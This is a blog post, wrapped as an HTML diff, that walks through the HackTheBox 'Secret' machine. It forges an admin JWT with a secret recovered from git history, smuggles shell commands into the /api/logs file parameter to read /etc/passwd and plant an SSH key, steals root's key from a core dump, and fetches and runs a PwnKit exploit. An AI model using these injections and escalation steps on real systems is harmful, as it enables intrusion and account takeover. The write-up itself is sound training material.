@@ -1,0 +1,564 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>HackTheBox - Secret – Jennifer Reeves – IT Security Enthusiast</title>
+    
+    
+
+
+
+
+
+
+    
+  
+        <meta charset="utf-8" />
+    <meta content='text/html; charset=utf-8' http-equiv='Content-Type'>
+    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
+    <meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0'>
+
+    
+    <meta name="description" content="Can you keep a secret?
+
+" />
+    <meta property="og:description" content="Can you keep a secret?
+
+" />
+    
+    <meta name="author" content="Jennifer Reeves" />
+
+    
+    <meta property="og:title" content="HackTheBox - Secret" />
+    <meta property="twitter:title" content="HackTheBox - Secret" />
+    
+
+    <!--[if lt IE 9]>
+      <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+
+    <link rel="stylesheet" type="text/css" href="/style.css" />
+    <link rel="alternate" type="application/rss+xml" title="Jennifer Reeves - IT Security Enthusiast" href="/feed.xml" />
+
+    <!-- Created with Jekyll Now - http://github.com/barryclark/jekyll-now -->
+  </head>
+
+  <body>
+    <div class="wrapper-masthead">
+      <div class="container">
+        <header class="masthead clearfix">
+          <a href="/" class="site-avatar"><img src="https://github.com/jbreeves/jbreeves.github.io/blob/master/images/self%20portrait.jpg?raw=true" /></a>
+
+          <div class="site-info">
+            <h1 class="site-name"><a href="/">Jennifer Reeves</a></h1>
+            <p class="site-description">IT Security Enthusiast</p>
+          </div>
+
+          <nav>
+            <a href="/">Blog</a>
+            <a href="/about">About</a>
+          </nav>
+        </header>
+      </div>
+    </div>
+
+    <div id="main" role="main" class="container">
+      <article class="post">
+  <h1>HackTheBox - Secret</h1>
+
+  <div class="entry">
+    <p><em>Can you keep a secret?</em></p>
+
+<hr />
+
+<h2 id="1-enumeration">1. Enumeration</h2>
+<ul>
+  <li>
+    <p>RustScan w/ Nmap</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  PORT     STATE SERVICE REASON  VERSION
+  22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+
+  | ssh-hostkey: 
+  |   3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA)
+  | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDBjDFc+UtqNVYIrxJx+2Z9ZGi7LtoV6vkWkbALvRXmFzqStfJ3UM7TuOcZcPd82vk0gFVN2/wjA3LUlbUlr7oSlD15DdJkr/XjYrZLJnG4NCxcAnbB5CIRaWmrrdGy5pJ/KgKr4UEVGDK+oAgE7wbv++el2WeD1DF8gw+GIHhtjrK1s0nfyNGcmGOwx8crtHB4xLpopAxWDr2jzMFMdGcIzZMRVLbe+TsG/8O/GFgNXU1WqFYGe4xl+MCmomjh9mUspf1WP2SRZ7V0kndJJxtRBTw6V+NQ/7EJYJPMeugOtbputyZMH+jALhzxBs07JLbw8Bh9JX+ZJl/j6VcIDfFRXxB7ceSe/cp4UYWcLqN+AsoE7k+uMCV6vmXYPNC3g5xfMMrDfVmGmrPbop0oPZUB3kr8iz5CI/qM61WI07/MME1uyM352WZHAJmeBLPAOy05ZBY+DgpVElkr0vVa+3UyKsF1dC3Qm2jisx/qh3sGauv1R8oXGHvy0+oeMOlJN+k=
+  |   256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA)
+  | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOL9rRkuTBwrdKEa+8VrwUjloHdmUdDR87hBOczK1zpwrsV/lXE1L/bYvDMUDVD0jE/aqMhekqNfBimt8aX53O0=
+  |   256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519)
+  |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINM1K8Yufj5FJnBjvDzcr+32BQ9R/2lS/Mu33ExJwsci
+
+  80/tcp   open  http    syn-ack nginx 1.18.0 (Ubuntu)
+  |_http-title: DUMB Docs
+  | http-methods: 
+  |_  Supported Methods: GET HEAD POST OPTIONS
+  |_http-server-header: nginx/1.18.0 (Ubuntu)
+
+  3000/tcp open  http    syn-ack Node.js (Express middleware)
+  |_http-title: DUMB Docs
+  | http-methods: 
+  |_  Supported Methods: GET HEAD POST OPTIONS
+
+  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Gobuster</p>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ┌──(acousticgirl㉿kali)-[~/CTF/HTB/secret]
+  └─$ gobuster dir -u 10.10.11.120 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt,js | tee gobuster_php.log
+  ===============================================================
+  Gobuster v3.1.0
+  by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+  ===============================================================
+  [+] Url:                     http://10.10.11.120
+  [+] Method:                  GET
+  [+] Threads:                 10
+  [+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
+  [+] Negative Status codes:   404
+  [+] User Agent:              gobuster/3.1.0
+  [+] Extensions:              php,html,txt,js
+  [+] Timeout:                 10s
+  ===============================================================
+  2022/03/14 20:54:37 Starting gobuster in directory enumeration mode
+  ===============================================================
+  /download             (Status: 301) [Size: 183] [--&gt; /download/]
+  /docs                 (Status: 200) [Size: 20720]               
+  /assets               (Status: 301) [Size: 179] [--&gt; /assets/]  
+  /api                  (Status: 200) [Size: 93]                  
+  /Docs                 (Status: 200) [Size: 20720]               
+  /API                  (Status: 200) [Size: 93]                  
+  /DOCS                 (Status: 200) [Size: 20720]               
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<h2 id="2-website">2. Website</h2>
+<ul>
+  <li>“DUMBDocs”</li>
+  <li>An API based authentication system using JWT tokens.</li>
+  <li>Node.js based</li>
+  <li>Can register new users through API system</li>
+  <li>Downloaded Source Code</li>
+</ul>
+
+<h2 id="3-source-code">3. Source Code</h2>
+<ul>
+  <li>Unzipped files.zip</li>
+  <li>Looked at several .js files - <code class="language-plaintext highlighter-rouge">local-web/index.js</code>, <code class="language-plaintext highlighter-rouge">local-web/routes/private.js</code>, <code class="language-plaintext highlighter-rouge">local-web/routes/verifytoken.js</code>, etc.</li>
+  <li>Got <code class="language-plaintext highlighter-rouge">theadmin</code> username from <code class="language-plaintext highlighter-rouge">local-web/routes/private.js</code></li>
+  <li><code class="language-plaintext highlighter-rouge">verifytoken.js</code> shows that no encryption algorithm is specified (possible to change?)</li>
+  <li>Two hidden items in <code class="language-plaintext highlighter-rouge">local-web</code> - <code class="language-plaintext highlighter-rouge">.git</code> and <code class="language-plaintext highlighter-rouge">.env</code>
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">.env</code> has the Token <code class="language-plaintext highlighter-rouge">secret</code> in it!
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ┌──(acousticgirl㉿kali)-[~/CTF/HTB/secret/local-web]
+  └─$ ls -la
+  total 116
+  drwxrwxr-x   8 acousticgirl acousticgirl  4096 Sep  3  2021 .
+  drwxr-xr-x   3 acousticgirl acousticgirl  4096 Mar 14 22:22 ..
+  -rw-rw-r--   1 acousticgirl acousticgirl    72 Sep  3  2021 .env
+  drwxrwxr-x   8 acousticgirl acousticgirl  4096 Sep  8  2021 .git
+  -rw-rw-r--   1 acousticgirl acousticgirl   885 Sep  3  2021 index.js
+  drwxrwxr-x   2 acousticgirl acousticgirl  4096 Aug 13  2021 model
+  drwxrwxr-x 201 acousticgirl acousticgirl  4096 Aug 13  2021 node_modules
+  -rw-rw-r--   1 acousticgirl acousticgirl   491 Aug 13  2021 package.json
+  -rw-rw-r--   1 acousticgirl acousticgirl 69452 Aug 13  2021 package-lock.json
+  drwxrwxr-x   4 acousticgirl acousticgirl  4096 Sep  3  2021 public
+  drwxrwxr-x   2 acousticgirl acousticgirl  4096 Sep  3  2021 routes
+  drwxrwxr-x   4 acousticgirl acousticgirl  4096 Aug 13  2021 src
+  -rw-rw-r--   1 acousticgirl acousticgirl   651 Aug 13  2021 validations.js
+                                                                                                                                                                             
+  ┌──(acousticgirl㉿kali)-[~/CTF/HTB/secret/local-web]
+  └─$ cat .env               
+  DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
+  *TOKEN_SECRET = secret*
+</code></pre></div>        </div>
+      </li>
+    </ul>
+  </li>
+</ul>
+
+<h2 id="4-action-plan">4. Action Plan</h2>
+<ul>
+  <li>Two possible routes
+    <ul>
+      <li><em>Plan 1</em> - Try to do a user replacement by creating a second <code class="language-plaintext highlighter-rouge">theadmin</code> user
+        <ul>
+          <li>Try to find place to upload a reverse shell</li>
+        </ul>
+      </li>
+      <li><em>Plan 2</em> - Create low level user and escalate privileges
+        <ul>
+          <li>Once created, alter JWT to try to login as <code class="language-plaintext highlighter-rouge">theadmin</code></li>
+          <li>Try to find place to upload a reverse shell</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+</ul>
+
+<h2 id="5-plan-1-from-outer-spaaaaaace">5. Plan 1 (from outer spaaaaaace!)</h2>
+<ul>
+  <li>Attempted user replacement
+    <ul>
+      <li>Attempt
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  curl -i -X POST \
+-H 'Content-Type: application/json' \
+-d '{"name":" theadmin", "email":"drt@dasith.works", "password":"testpassword"}' \
+http://10.10.11.120/api/user/register
+</code></pre></div>        </div>
+      </li>
+      <li>
+        <p>Success! (but not really)</p>
+
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  HTTP/1.1 200 OK
+  Server: nginx/1.18.0 (Ubuntu)
+  Date: Tue, 15 Mar 2022 01:59:53 GMT
+  Content-Type: application/json; charset=utf-8
+  Content-Length: 20
+  Connection: keep-alive
+  X-Powered-By: Express
+  ETag: W/"14-LWrfBFPQd+iUl+P35I+Rt9MzQss"
+
+  {"user":" theadmin"}
+</code></pre></div>        </div>
+      </li>
+      <li>The user was created but it is ` theadmin<code class="language-plaintext highlighter-rouge"> and not </code>theadmin` (notice the leading space). However, they both use the same email address.
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  curl -i -X POST \
+  -H 'Content-Type: application/json' \
+  -d '{"email":"drt@dasith.works", "password":"testpassword"}' \
+  http://10.10.11.120/api/user/login
+</code></pre></div>        </div>
+      </li>
+      <li>
+        <p>Successfully logged in with ` theadmin` email and got our JWT:</p>
+
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  HTTP/1.1 200 OK
+  Server: nginx/1.18.0 (Ubuntu)
+  Date: Tue, 15 Mar 2022 02:04:48 GMT
+  Content-Type: text/html; charset=utf-8
+  Content-Length: 211
+  Connection: keep-alive
+  X-Powered-By: Express
+  auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjJmZjMxOTlhNjA2ODA0NjM4OGRkMGQiLCJuYW1lIjoiIHRoZWFkbWluIiwiZW1haWwiOiJkcnRAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjQ3MzA5ODg4fQ.hBPK1WyMZS5Xo1-DYmgN8iJimPStxfc6F1z5_mQp_Ls
+  ETag: W/"d3-AbKQ3P+XBBjA9PHtvEjPlyeZqFA"
+
+  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjJmZjMxOTlhNjA2ODA0NjM4OGRkMGQiLCJuYW1lIjoiIHRoZWFkbWluIiwiZW1haWwiOiJkcnRAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjQ3MzA5ODg4fQ.hBPK1WyMZS5Xo1-DYmgN8iJimPStxfc6F1z5_mQp_Ls  
+</code></pre></div>        </div>
+      </li>
+    </ul>
+  </li>
+</ul>
+
+<h2 id="6-plan-2">6. Plan 2</h2>
+<ul>
+  <li>Low level user creation (achieved in Step 5)</li>
+  <li>Let’s alter our username in the JWT at https://jwt.io and sign it with our secret key
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjJmZjMxOTlhNjA2ODA0NjM4OGRkMGQiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImRydEBkYXNpdGgud29ya3MiLCJpYXQiOjE2NDczMDk4ODh9.ZoGUsmIsEESpXWqzWVczp-6ye-tLZzGQ_vciLwbsZjw
+</code></pre></div>    </div>
+  </li>
+  <li>Lets test our token
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  curl -X POST http://10.10.11.120:3000/api/user/login
+ -H "Authorization: Bearer {eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjJmZjMxOTlhNjA2ODA0NjM4OGRkMGQiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImRydEBkYXNpdGgud29ya3MiLCJpYXQiOjE2NDczMDk4ODh9.ZoGUsmIsEESpXWqzWVczp-6ye-tLZzGQ_vciLwbsZjw}"
+ -d ‘{“email”:”drt@dasiths.works”,”password”:”testpassword”}’
+
+ ┌──(acousticgirl㉿kali)-[~/CTF/HTB/secret/local-web]
+ └─$ curl -i http://10.10.11.120:3000/api/priv 
+ HTTP/1.1 401 Unauthorized
+ X-Powered-By: Express
+ Content-Type: text/html; charset=utf-8
+ Content-Length: 13
+ ETag: W/"d-Fke522wB/f0WEQT+w6CDKWhElh4"
+ Date: Tue, 15 Mar 2022 03:41:39 GMT
+ Connection: keep-alive
+
+ Access Denied         
+</code></pre></div>    </div>
+  </li>
+  <li>Access is still denied so <code class="language-plaintext highlighter-rouge">secret</code> must not be the correct key for <code class="language-plaintext highlighter-rouge">theadmin</code></li>
+</ul>
+
+<h2 id="7-back-to-the-source-code">7. Back to the Source Code</h2>
+<ul>
+  <li>Digging into the source code, there’s a hidden <code class="language-plaintext highlighter-rouge">.git</code> folder</li>
+  <li>
+    <p>Let’s look at the git logs to see if anything changed</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ┌──(acousticgirl㉿kali)-[~/…/HTB/secret/local-web/.git]
+  └─$ git log                                         
+  commit e297a2797a5f62b6011654cf6fb6ccb6712d2d5b (HEAD -&gt; master)
+  Author: dasithsv &lt;dasithsv@gmail.com&gt;
+  Date:   Thu Sep 9 00:03:27 2021 +0530
+
+      now we can view logs from server 😃
+
+  commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
+  Author: dasithsv &lt;dasithsv@gmail.com&gt;
+  Date:   Fri Sep 3 11:30:17 2021 +0530
+
+      removed .env for security reasons
+
+  commit de0a46b5107a2f4d26e348303e76d85ae4870934
+  Author: dasithsv &lt;dasithsv@gmail.com&gt;
+  Date:   Fri Sep 3 11:29:19 2021 +0530
+
+      added /downloads
+
+  commit 4e5547295cfe456d8ca7005cb823e1101fd1f9cb
+  Author: dasithsv &lt;dasithsv@gmail.com&gt;
+  Date:   Fri Sep 3 11:27:35 2021 +0530
+
+      removed swap
+</code></pre></div>    </div>
+
+    <ul>
+      <li>
+        <p>This line looks promising - <code class="language-plaintext highlighter-rouge">removed .env for security reasons</code> so lets look at that commit</p>
+
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ┌──(acousticgirl㉿kali)-[~/CTF/HTB/secret/local-web]
+  └─$ git log -p  -- .env    
+  commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
+  Author: dasithsv &lt;dasithsv@gmail.com&gt;
+  Date:   Fri Sep 3 11:30:17 2021 +0530
+
+      removed .env for security reasons
+
+  diff --git a/.env b/.env
+  index fb6f587..31db370 100644
+  --- a/.env
+  +++ b/.env
+  @@ -1,2 +1,2 @@
+  DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
+  -TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
+  +TOKEN_SECRET = secret
+
+  commit 55fe756a29268f9b4e786ae468952ca4a8df1bd8
+  Author: dasithsv &lt;dasithsv@gmail.com&gt;
+  Date:   Fri Sep 3 11:25:52 2021 +0530
+
+      first commit
+
+  diff --git a/.env b/.env
+  new file mode 100644
+</code></pre></div>        </div>
+      </li>
+    </ul>
+  </li>
+  <li>It looks like the key was set to
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
+</code></pre></div>    </div>
+
+    <ul>
+      <li>Lets go back to https://jwt.io and use that as the secret key (instead of <em>secret</em>)</li>
+      <li>New token
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjJmZjMxOTlhNjA2ODA0NjM4OGRkMGQiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImRydEBkYXNpdGgud29ya3MiLCJpYXQiOjE2NDczMDk4ODh9.U2kHzOJQZLIX8YzMvyx-Bsl4-7FLFDSfedr7vGXYh6U
+</code></pre></div>        </div>
+      </li>
+    </ul>
+  </li>
+  <li>Testing the new token
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  curl http://10.10.11.120:3000/api/priv   -H "auth-token:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjMwY2I0MDQyNGNmMDA0NWRmYmIyODAiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImFjb3VzdGljZ2lybEBkYXNpdGgud29ya3MiLCJpYXQiOjE2NDczNjQ5NDB9.bf79mgAuXL4tf05-Avv_Ami2WH-QlZFvr6WRtTng1kU"
+</code></pre></div>    </div>
+  </li>
+  <li><strong>SUCCESS!</strong>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> ┌──(acousticgirl㉿kali)-[~/CTF/HTB/secret/local-web]
+ └─$ curl http://10.10.11.120:3000/api/priv   -H "auth-token:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjMwY2I0MDQyNGNmMDA0NWRmYmIyODAiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImFjb3VzdGljZ2lybEBkYXNpdGgud29ya3MiLCJpYXQiOjE2NDczNjQ5NDB9.bf79mgAuXL4tf05-Avv_Ami2WH-QlZFvr6WRtTng1kU"
+ {"creds":{"role":"admin","username":"theadmin","desc":"welcome back admin"}}     
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<h2 id="8-abusing-apilogs">8. Abusing /api/logs</h2>
+
+<ul>
+  <li>You can query http://10.10.11.120/api/logs as admin and execute commands through index.js which includes an <code class="language-plaintext highlighter-rouge">exec()</code> call.</li>
+  <li>Requests must be URL encoded (I used https://gchq.github.io/CyberChef/ for this)</li>
+  <li>You can run the following request to read /etc/passwd
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  http://10.10.11.120/api/logs?file=index.js;cat%20/etc/passwd
+</code></pre></div>    </div>
+  </li>
+  <li>Reading /etc/passwd gives you the name of the non-standard user <code class="language-plaintext highlighter-rouge">dasith</code></li>
+</ul>
+
+<h2 id="9-gaining-ssh">9. Gaining SSH</h2>
+<ul>
+  <li>Generate a new ssh key for this challenge and label it secret.htb
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ssh-keygen -t rsa -b 4096 -C 'acousticgirl@htb' -f secret.htb -P ''
+</code></pre></div>    </div>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  - -C is the comment
+  - -t is the type
+  - -b is the bytes
+  - -f is the file name
+  - -P is the password
+</code></pre></div>    </div>
+  </li>
+  <li>Set your secret.htb file to be your <code class="language-plaintext highlighter-rouge">$PUBLIC_KEY</code>
+  <code class="language-plaintext highlighter-rouge">export PUBLIC_KEY=$(cat secret.htb.pub)</code>
+      - You <strong>must</strong> do this step</li>
+  <li>Craft a GET request that adds your <code class="language-plaintext highlighter-rouge">$PUBLIC_KEY</code> contents to /home/dasith/.ssh/authorized_keys on the target machine
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ┌──(acousticgirl㉿kali)-[~/CTF/HTB/secret]
+  └─$ curl \
+  &gt; -i \
+  &gt; -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjMwY2I0MDQyNGNmMDA0NWRmYmIyODAiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImFjb3VzdGljZ2lybEBkYXNpdGgud29ya3MiLCJpYXQiOjE2NDczNjQ5NDB9.bf79mgAuXL4tf05-Avv_Ami2WH-QlZFvr6WRtTng1kU' \
+  &gt; -G \
+  &gt; --data-urlencode "file=index.js; mkdir -p /home/dasith/.ssh; echo $PUBLIC_KEY &gt;&gt; /home/dasith/.ssh/authorized_keys" \
+  &gt; 'http://10.10.11.120/api/logs'
+  HTTP/1.1 200 OK
+  Server: nginx/1.18.0 (Ubuntu)
+  Date: Tue, 15 Mar 2022 18:28:33 GMT
+  Content-Type: application/json; charset=utf-8
+  Content-Length: 27
+  Connection: keep-alive
+  X-Powered-By: Express
+  ETag: W/"1b-pFfOEX46IRaNi6v8ztcwIwl9EF8"
+
+  "ab3e953 Added the codes\n" 
+</code></pre></div>    </div>
+  </li>
+  <li>Login with SSH
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ssh -i secret.htb dasith@10.10.11.120
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<h2 id="10-user-flag">10. User Flag</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>```
+cat user.txt
+d##############################d
+```
+</code></pre></div></div>
+
+<h2 id="11-gaining-root-path-1---coredump">11. Gaining Root (Path 1 - CoreDump)</h2>
+<ul>
+  <li>There are two paths to gaining root on this box. This is the way the creators of the box intended you to root the box.</li>
+  <li>Enumerate common directories either manually or with linpeas (I chose linpeas)
+    <ul>
+      <li>Get <code class="language-plaintext highlighter-rouge">linpeas.sh</code> onto the box, chmod it, and run</li>
+      <li>You will find a file that has a SUID bit set as root (<code class="language-plaintext highlighter-rouge">/opt/count</code>)</li>
+    </ul>
+  </li>
+  <li>Try the <code class="language-plaintext highlighter-rouge">/opt/count</code> program
+    <ul>
+      <li>It’s like <code class="language-plaintext highlighter-rouge">wc</code> and can save to a file</li>
+    </ul>
+  </li>
+  <li>Investigate /opt/
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  dasith@secret:/tmp$ ls -la /opt
+  total 56
+  drwxr-xr-x  2 root root  4096 Oct  7 10:06 .
+  drwxr-xr-x 20 root root  4096 Oct  7 15:01 ..
+  -rw-r--r--  1 root root  3736 Oct  7 10:01 code.c
+  -rw-r--r--  1 root root 16384 Oct  7 10:01 .code.c.swp
+  -rwsr-xr-x  1 root root 17824 Oct  7 10:03 count
+  -rw-r--r--  1 root root  4622 Oct  7 10:04 valgrind.log
+</code></pre></div>    </div>
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">valgrind.log</code> contains memory dump information
+        <ul>
+          <li>This indicates that CoreDump is enabled</li>
+        </ul>
+      </li>
+      <li><code class="language-plaintext highlighter-rouge">code.c</code> is the source code for count (I think…my C is <em>really</em> rusty)</li>
+    </ul>
+  </li>
+  <li>Use <code class="language-plaintext highlighter-rouge">/opt/count</code> to count the lines for /root/.ssh/id_rsa
+    <ul>
+      <li>When it asks you to save it to a file, hit <code class="language-plaintext highlighter-rouge">Ctrl + z</code> to put it in the background</li>
+      <li>List running processes with <code class="language-plaintext highlighter-rouge">ps</code></li>
+      <li>Kill the count process
+  <code class="language-plaintext highlighter-rouge">kill -SIGSEGV &lt;PID&gt;</code></li>
+      <li>Bring your session to the foreground with <code class="language-plaintext highlighter-rouge">fg</code></li>
+      <li>Program will crash and memory will be dumped.</li>
+    </ul>
+  </li>
+  <li>Travel to <code class="language-plaintext highlighter-rouge">/var/crash</code> and look for the file with the owner set to <code class="language-plaintext highlighter-rouge">dasith</code>
+    <ul>
+      <li>Use apport-unpack to decompress the file to a directory in <code class="language-plaintext highlighter-rouge">/tmp</code></li>
+    </ul>
+  </li>
+  <li>Travel to your unpacked crash directory and view CoreDump
+  <code class="language-plaintext highlighter-rouge">less CoreDump</code>
+    <ul>
+      <li>It will warn you it’s a binary. Select Y to view it anyway.</li>
+    </ul>
+  </li>
+  <li>Scroll until you see BEGIN RSA KEY in plain text</li>
+  <li>Copy this key to your attacking machine and save it</li>
+  <li>Use this file to SSH as root
+  <code class="language-plaintext highlighter-rouge">ssh -i id_rsa root@10.10.11.120</code></li>
+</ul>
+
+<h2 id="12-root-flag">12. Root Flag</h2>
+<ul>
+  <li>Navigate to <code class="language-plaintext highlighter-rouge">/root</code>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  cat root.txt
+  a##############################8
+</code></pre></div>    </div>
+  </li>
+  <li>VICTORY!</li>
+</ul>
+
+<h2 id="13-gaining-root-path-2---pwnkit">13. Gaining Root (Path 2 - PwnKit)</h2>
+<ul>
+  <li>This is the easy way…</li>
+  <li>It exploits a vulnerability in policykit (CVE-2021-4034)</li>
+  <li>As <code class="language-plaintext highlighter-rouge">dasith</code> user, navigate to <code class="language-plaintext highlighter-rouge">/tmp</code></li>
+  <li>In the directory that your PwnKit script is in, start an HTTP server with Python
+  <code class="language-plaintext highlighter-rouge">python3 -m http.server 80</code></li>
+  <li>On victim machine, pull the script down, chmod it to be executable, and run it
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  wget &lt;your ip&gt;/PwnKit
+  chmod +x PwnKit
+  ./PwnKit
+</code></pre></div>    </div>
+  </li>
+  <li>TADA! You are root!</li>
+  <li>Proceed to cat /root/root.txt for the root flag.</li>
+</ul>
+
+  </div>
+  <br>
+  <br>
+  <span>[
+    
+      
+      <a href="/tag/HTB"><code class="highligher-rouge"><nobr>HTB</nobr></code>&nbsp;</a>
+    
+      
+      <a href="/tag/CTF"><code class="highligher-rouge"><nobr>CTF</nobr></code>&nbsp;</a>
+    
+      
+      <a href="/tag/JWT"><code class="highligher-rouge"><nobr>JWT</nobr></code>&nbsp;</a>
+    
+  ]</span>
+  <br>
+  <br>
+  <div class="date">
+    Written on March 15, 2022
+  </div>
+
+  
+</article>
+
+    </div>
+
+    <div class="wrapper-footer">
+      <div class="container">
+        <footer class="footer">
+          
+
+
+
+<a href="https://github.com/jbreeves"><i class="svg-icon github"></i></a>
+
+<a href="https://www.linkedin.com/in/jbreeves"><i class="svg-icon linkedin"></i></a>
+
+
+<a href="https://www.twitter.com/acousticgirl"><i class="svg-icon twitter"></i></a>
+
+
+
+        </footer>
+      </div>
+    </div>
+
+    
+
+  </body>
+</html>
